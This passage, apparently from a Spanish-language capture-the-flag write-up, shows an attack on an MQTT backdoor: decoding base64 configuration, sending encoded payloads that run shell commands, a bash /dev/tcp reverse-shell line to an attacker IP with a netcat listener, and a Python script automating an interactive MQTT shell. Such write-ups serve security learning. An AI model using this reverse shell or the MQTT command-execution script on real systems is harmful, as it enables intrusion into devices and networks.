+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>11787558305197886171</span><span class=p>,</span><span class=s2>&#34;yaxis&#34;</span><span class=ss>:-</span><span class=mi>144</span><span class=o>.</span><span class=mo>0203</span><span class=mi>9</span><span class=p>,</span><span class=s2>&#34;xaxis&#34;</span><span class=ss>:-</span><span class=mi>82</span><span class=o>.</span><span class=mi>35095</span><span class=p>,</span><span class=s2>&#34;zoom&#34;</span><span class=p>:</span><span class=mi>1</span><span class=o>.</span><span class=mi>5777023</span><span class=p>,</span><span class=s2>&#34;movement&#34;</span><span class=ss>:false</span><span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>362540386312205955</span><span class=p>,</span><span class=s2>&#34;gain&#34;</span><span class=p>:</span><span class=mi>53</span><span class=p>}</span>                                                      
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>15714029982213522667</span><span class=p>,</span><span class=s2>&#34;color&#34;</span><span class=ss>:&#34;BLUE&#34;</span><span class=p>,</span><span class=s2>&#34;status&#34;</span><span class=ss>:&#34;OFF&#34;</span><span class=p>}</span>                                
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>3225961129491872569</span><span class=p>,</span><span class=s2>&#34;temperature&#34;</span><span class=p>:</span><span class=mi>24</span><span class=o>.</span><span class=mo>01401</span><span class=mi>9</span><span class=p>}</span>                                       
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>6359058373619665251</span><span class=p>,</span><span class=s2>&#34;in_use&#34;</span><span class=ss>:true</span><span class=p>,</span><span class=s2>&#34;temperature&#34;</span><span class=p>:</span><span class=mi>150</span><span class=o>.</span><span class=mi>87917</span><span class=p>,</span><span class=s2>&#34;toast_time&#34;</span><span class=p>:</span><span class=mi>355</span><span class=p>}</span>        
+</span></span><span class=line><span class=cl><span class=n>eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ</span><span class=o>==</span>           
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>8925898765875057015</span><span class=p>,</span><span class=s2>&#34;gain&#34;</span><span class=p>:</span><span class=mi>48</span><span class=p>}</span>                                                     
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>2001014962008406095</span><span class=p>,</span><span class=s2>&#34;color&#34;</span><span class=ss>:&#34;GREEN&#34;</span><span class=p>,</span><span class=s2>&#34;status&#34;</span><span class=ss>:&#34;ON&#34;</span><span class=p>}</span>                                 
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>8547104042568522656</span><span class=p>,</span><span class=s2>&#34;temperature&#34;</span><span class=p>:</span><span class=mi>23</span><span class=o>.</span><span class=mi>311316</span><span class=p>}</span>                                       
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>14895217707509815085</span><span class=p>,</span><span class=s2>&#34;in_use&#34;</span><span class=ss>:true</span><span class=p>,</span><span class=s2>&#34;temperature&#34;</span><span class=p>:</span><span class=mi>140</span><span class=o>.</span><span class=mi>93825</span><span class=p>,</span><span class=s2>&#34;toast_time&#34;</span><span class=p>:</span><span class=mi>256</span><span class=p>}</span>       
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>1184916321032100268</span><span class=p>,</span><span class=s2>&#34;yaxis&#34;</span><span class=p>:</span><span class=mi>9</span><span class=o>.</span><span class=mo>07</span><span class=mi>9117</span><span class=p>,</span><span class=s2>&#34;xaxis&#34;</span><span class=ss>:-</span><span class=mi>152</span><span class=o>.</span><span class=mi>9006</span><span class=p>,</span><span class=s2>&#34;zoom&#34;</span><span class=p>:</span><span class=mi>4</span><span class=o>.</span><span class=mi>1694174</span><span class=p>,</span><span class=s2>&#34;movement&#34;</span><span class=ss>:false</span><span class=p>}</span>                                                                          
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>14470891104289638540</span><span class=p>,</span><span class=s2>&#34;gain&#34;</span><span class=p>:</span><span class=mi>69</span><span class=p>}</span>                                                    
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>5335963935520223638</span><span class=p>,</span><span class=s2>&#34;temperature&#34;</span><span class=p>:</span><span class=mi>24</span><span class=o>.</span><span class=mi>225779</span><span class=p>}</span>                                       
+</span></span><span class=line><span class=cl><span class=p>{</span><span class=s2>&#34;id&#34;</span><span class=p>:</span><span class=mi>10084623511089974040</span><span class=p>,</span><span class=s2>&#34;color&#34;</span><span class=ss>:&#34;GREEN&#34;</span><span class=p>,</span><span class=s2>&#34;status&#34;</span><span class=ss>:&#34;OFF&#34;</span><span class=p>}</span> </span></span></code></pre></div><p>Tenemos un texto codificado en <strong>Base64</strong>, descifremos a ver que dice:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlZ2lzdGVyZWRfY29tbWFuZHMiOlsiSEVMUCIsIkNNRCIsIlNZUyJdLCJwdWJfdG9waWMiOiJVNHZ5cU5sUXRmLzB2b3ptYVp5TFQvMTVIOVRGNkNIZy9wdWIiLCJzdWJfdG9waWMiOiJYRDJyZlI5QmV6L0dxTXBSU0VvYmgvVHZMUWVoTWcwRS9zdWIifQ==&#39;</span> <span class=p>|</span> base64 -d <span class=p>|</span> jq</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;registered_commands&#34;</span><span class=p>:</span> <span class=p>[</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;HELP&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;CMD&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;SYS&#34;</span>
+</span></span><span class=line><span class=cl>  <span class=p>],</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;pub_topic&#34;</span><span class=p>:</span> <span class=s2>&#34;U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;sub_topic&#34;</span><span class=p>:</span> <span class=s2>&#34;XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div><p>Parece que el servidor tiene un dispositivo con una configuración de ejecución remota de comandos(RCE), probemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Nos ponemos en escucha en este tópico</span>
+</span></span><span class=line><span class=cl>mosquitto_sub -h 10.201.28.145 -t <span class=s2>&#34;U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Ejecutamos un comando permitido en ese tópico -&gt; HELP</span>
+</span></span><span class=line><span class=cl>mosquitto_pub -h 10.201.28.145 -t <span class=s1>&#39;XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub&#39;</span> -m <span class=s1>&#39;HELP&#39;</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-ruby data-lang=ruby><span class=line><span class=cl><span class=no>SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ</span><span class=o>+</span><span class=no>IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk</span><span class=o>=</span></span></span></code></pre></div><p>Nos regresa un texto codificado en <strong>Base64</strong>, lo decodificamos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;SW52YWxpZCBtZXNzYWdlIGZvcm1hdC4KRm9ybWF0OiBiYXNlNjQoeyJpZCI6ICI8YmFja2Rvb3IgaWQ+IiwgImNtZCI6ICI8Y29tbWFuZD4iLCAiYXJnIjogIjxhcmd1bWVudD4ifSk=&#39;</span> <span class=p>|</span> base64 -d<span class=p>;</span>echo</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>Invalid message format.
+</span></span><span class=line><span class=cl>Format: base64({&#34;id&#34;: &#34;&lt;backdoor id&gt;&#34;, &#34;cmd&#34;: &#34;&lt;command&gt;&#34;, &#34;arg&#34;: &#34;&lt;argument&gt;&#34;})</span></span></code></pre></div><p>Nos muestra que debemos enviar el payload en un formato en especifico.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Payload</span>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;{&#34;id&#34;: &#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;, &#34;cmd&#34;: &#34;HELP&#34;, &#34;arg&#34;: &#34;&#34;}&#39;</span> <span class=p>|</span> base64 /* <span class=nv>eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkhFTFAiLCAiYXJnIjogIiJ9Cg</span><span class=o>==</span> */
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Enviamos </span>
+</span></span><span class=line><span class=cl>mosquitto_pub -h 10.201.28.145 -t <span class=s1>&#39;XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub&#39;</span> -m <span class=s1>&#39;eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkhFTFAiLCAiYXJnIjogIiJ9Cg==&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Decodificamos la respuesta</span>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiTWVzc2FnZSBmb3JtYXQ6XG4gICAgQmFzZTY0KHtcbiAgICAgICAgXCJpZFwiOiBcIjxCYWNrZG9vciBJRD5cIixcbiAgICAgICAgXCJjbWRcIjogXCI8Q29tbWFuZD5cIixcbiAgICAgICAgXCJhcmdcIjogXCI8YXJnPlwiLFxuICAgIH0pXG5cbkNvbW1hbmRzOlxuICAgIEhFTFA6IERpc3BsYXkgaGVscCBtZXNzYWdlICh0YWtlcyBubyBhcmcpXG4gICAgQ01EOiBSdW4gYSBzaGVsbCBjb21tYW5kXG4gICAgU1lTOiBSZXR1cm4gc3lzdGVtIGluZm9ybWF0aW9uICh0YWtlcyBubyBhcmcpXG4ifQ==&#39;</span> <span class=p>|</span> base64 -d <span class=p>|</span> jq</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;response&#34;</span><span class=p>:</span> <span class=s2>&#34;Message format:/n    Base64({/n        /&#34;</span><span class=err>id/</span><span class=s2>&#34;: /&#34;</span><span class=err>&lt;Backdoor</span> <span class=err>ID&gt;/</span><span class=s2>&#34;,/n        /&#34;</span><span class=err>cmd/</span><span class=s2>&#34;: /&#34;</span><span class=err>&lt;Command&gt;/</span><span class=s2>&#34;,/n        /&#34;</span><span class=err>arg/</span><span class=s2>&#34;: /&#34;</span><span class=err>&lt;arg&gt;/</span><span class=s2>&#34;,/n    })/n/nCommands:/n    HELP: Display help message (takes no arg)/n    CMD: Run a shell command/n    SYS: Return system information (takes no arg)/n&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div><p>Ya entendemos como funciona, creamos otra vez otro payload y seguimos en escucha con <strong>mosquitto_sub</strong></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Payload</span>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;{&#34;id&#34;: &#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;, &#34;cmd&#34;: &#34;CMD&#34;, &#34;arg&#34;: &#34;whoami;pwd&#34;}&#39;</span> <span class=p>|</span> base64 /* <span class=nv>eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAid2hvYW1pO3B3ZCJ9Cg</span><span class=o>==</span> */
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Enviamos</span>
+</span></span><span class=line><span class=cl>mosquitto_pub -h 10.201.28.145 -t <span class=s1>&#39;XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub&#39;</span> -m <span class=s1>&#39;eyJpZCI6ICJjZGQxYjFjMC0xYzQwLTRiMGYtOGUyMi02MWIzNTc1NDhiN2QiLCAiY21kIjogIkNNRCIsICJhcmciOiAid2hvYW1pO3B3ZCJ9Cg==&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Decodificamos la respuesta</span>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s1>&#39;eyJpZCI6ImNkZDFiMWMwLTFjNDAtNGIwZi04ZTIyLTYxYjM1NzU0OGI3ZCIsInJlc3BvbnNlIjoiY2hhbGxlbmdlXG4vaG9tZS9jaGFsbGVuZ2VcbiJ9&#39;</span> <span class=p>|</span> base64 -d <span class=p>|</span> jq</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-json data-lang=json><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;id&#34;</span><span class=p>:</span> <span class=s2>&#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>  <span class=nt>&#34;response&#34;</span><span class=p>:</span> <span class=s2>&#34;challenge/n/home/challenge/n&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span></span></span></code></pre></div><p>Efectivamente, tenemos ejecución remota de comandos(RCE). Tratemos de enviar una reverse shell a nuestra máquina atacante.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Payload</span>
+</span></span><span class=line><span class=cl>bash -c <span class=s2>&#34;bash -i &amp;&gt; /dev/tcp/10.23.10.113/443 0&gt;&amp;1&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Nos ponemos en escucha</span>
+</span></span><span class=line><span class=cl>nc -lnvp <span class=m>443</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>  &#34;id&#34;: &#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;,
+</span></span><span class=line><span class=cl>  &#34;response&#34;: &#34;bash: connect: Network is unreachable/nbash: line 1: /dev/tcp/10.23.10.113/443: Network is unreachable/n&#34;
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl># Hostname -I
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>  &#34;id&#34;: &#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;,
+</span></span><span class=line><span class=cl>  &#34;response&#34;: &#34;172.18.0.2 /n&#34;
+</span></span><span class=line><span class=cl>}</span></span></code></pre></div><p>No funcionó, parece que está en un entorno de docker con segmento de red aislado (172.x.x.x), probemos a automatizar este proceso porque es muy tardío generar texto base64, decodificar&mldr;</p><p><code>rce_mqtt.py</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>subprocess</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>base64</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>json</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>time</span>
+</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>threading</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Colors</span>
+</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>Colors</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=n>RESET</span> <span class=o>=</span> <span class=s1>&#39;/033[0m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>BOLD</span> <span class=o>=</span> <span class=s1>&#39;/033[1m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>UNDERLINE</span> <span class=o>=</span> <span class=s1>&#39;/033[4m&#39;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1># Colores de texto</span>
+</span></span><span class=line><span class=cl>    <span class=n>BLACK</span> <span class=o>=</span> <span class=s1>&#39;/033[30m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>RED</span> <span class=o>=</span> <span class=s1>&#39;/033[31m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>GREEN</span> <span class=o>=</span> <span class=s1>&#39;/033[32m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>YELLOW</span> <span class=o>=</span> <span class=s1>&#39;/033[33m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>BLUE</span> <span class=o>=</span> <span class=s1>&#39;/033[34m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>MAGENTA</span> <span class=o>=</span> <span class=s1>&#39;/033[35m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>CYAN</span> <span class=o>=</span> <span class=s1>&#39;/033[36m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>WHITE</span> <span class=o>=</span> <span class=s1>&#39;/033[37m&#39;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=c1># Colores de fondo</span>
+</span></span><span class=line><span class=cl>    <span class=n>BG_BLACK</span> <span class=o>=</span> <span class=s1>&#39;/033[40m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>BG_RED</span> <span class=o>=</span> <span class=s1>&#39;/033[41m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>BG_GREEN</span> <span class=o>=</span> <span class=s1>&#39;/033[42m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>BG_YELLOW</span> <span class=o>=</span> <span class=s1>&#39;/033[43m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>BG_BLUE</span> <span class=o>=</span> <span class=s1>&#39;/033[44m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>BG_MAGENTA</span> <span class=o>=</span> <span class=s1>&#39;/033[45m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>BG_CYAN</span> <span class=o>=</span> <span class=s1>&#39;/033[46m&#39;</span>
+</span></span><span class=line><span class=cl>    <span class=n>BG_WHITE</span> <span class=o>=</span> <span class=s1>&#39;/033[47m&#39;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># Configuración</span>
+</span></span><span class=line><span class=cl><span class=n>broker_host</span> <span class=o>=</span> <span class=s2>&#34;10.201.26.45&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>topic_sub</span> <span class=o>=</span> <span class=s2>&#34;U4vyqNlQtf/0vozmaZyLT/15H9TF6CHg/pub&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>topic_pub</span> <span class=o>=</span> <span class=s2>&#34;XD2rfR9Bez/GqMpRSEobh/TvLQehMg0E/sub&#34;</span>
+</span></span><span class=line><span class=cl><span class=n>command_id</span> <span class=o>=</span> <span class=s2>&#34;cdd1b1c0-1c40-4b0f-8e22-61b357548b7d&#34;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>send_command</span><span class=p>(</span><span class=n>command</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;id&#34;</span><span class=p>:</span> <span class=n>command_id</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;cmd&#34;</span><span class=p>:</span> <span class=s2>&#34;CMD&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s2>&#34;arg&#34;</span><span class=p>:</span> <span class=n>command</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=n>encoded_payload</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64encode</span><span class=p>(</span><span class=n>json</span><span class=o>.</span><span class=n>dumps</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span><span class=o>.</span><span class=n>decode</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=n>cmd</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;mosquitto_pub -h </span><span class=si>{</span><span class=n>broker_host</span><span class=si>}</span><span class=s2> -t &#39;</span><span class=si>{</span><span class=n>topic_pub</span><span class=si>}</span><span class=s2>&#39; -m &#39;</span><span class=si>{</span><span class=n>encoded_payload</span><span class=si>}</span><span class=s2>&#39;&#34;</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>DEVNULL</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>Colors</span><span class=o>.</span><span class=n>YELLOW</span><span class=si>}</span><span class=s2>[+] </span><span class=si>{</span><span class=n>Colors</span><span class=o>.</span><span class=n>GREEN</span><span class=si>}</span><span class=s2>Comando enviado</span><span class=si>{</span><span class=n>Colors</span><span class=o>.</span><span class=n>RESET</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>command</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>listen_responses</span><span class=p>():</span>
+</span></span><span class=line><span class=cl>    <span class=k>while</span> <span class=kc>True</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=n>cmd</span> <span class=o>=</span> <span class=sa>f</span><span class=s2>&#34;mosquitto_sub -h </span><span class=si>{</span><span class=n>broker_host</span><span class=si>}</span><span class=s2> -t &#39;</span><span class=si>{</span><span class=n>topic_sub</span><span class=si>}</span><span class=s2>&#39; -C 1&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span><span class=n>cmd</span><span class=p>,</span> <span class=n>shell</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>capture_output</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>text</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>            
+</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>result</span><span class=o>.</span><span class=n>stdout</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                <span class=n>response</span> <span class=o>=</span> <span class=n>result</span><span class=o>.</span><span class=n>stdout</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>                <span class=k>try</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=n>decoded</span> <span class=o>=</span> <span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>response</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span> <span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=n>data</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>decoded</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;/n</span><span class=si>{</span><span class=n>Colors</span><span class=o>.</span><span class=n>YELLOW</span><span class=si>}</span><span class=s2>[+] </span><span class=si>{</span><span class=n>Colors</span><span class=o>.</span><span class=n>GREEN</span><span class=si>}</span><span class=s2>Respuesta</span><span class=si>{</span><span class=n>Colors</span><span class=o>.</span><span class=n>RESET</span><span class=si>}</span><span class=s2>:/n</span><span class=si>{</span><span class=n>data</span><span class=p>[</span><span class=s1>&#39;response&#39;</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=k>except</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>                    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;/n</span><span class=si>{</span><span class=n>Colors</span><span class=o>.</span><span class=n>YELLOW</span><span class=si>}</span><span class=s2>[!] </span><span class=si>{</span><span class=n>Colors</span><span class=o>.</span><span class=n>RED</span><span class=si>}</span><span class=s2>Respuesta cruda</span><span class=si>{</span><span class=n>Colors</span><span class=o>.</span><span class=n>RESET</span><span class=si>}</span><span class=s2>: </span><span class=si>{</span><span class=n>response</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>TimeoutExpired</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=k>pass</span>
+</span></span><span class=line><span class=cl>        <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=n>e</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>        <span class=n>time</span><span class=o>.</span><span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>Colors</span><span class=o>.</span><span class=n>CYAN</span><span class=si>}</span><span class=s2>Shell interactiva MQTT </span><span class=si>{</span><span class=n>Colors</span><span class=o>.</span><span class=n>RESET</span><span class=si>}</span><span class=s2>(escribe &#39;exit&#39; para salir)&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>50</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=n>listener</span> <span class=o>=</span> <span class=n>threading</span><span class=o>.</span><span class=n>Thread</span><span class=p>(</span><span class=n>target</span><span class=o>=</span><span class=n>listen_responses</span><span class=p>,</span> <span class=n>daemon</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>listener</span><span class=o>.</span><span class=n>start</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    
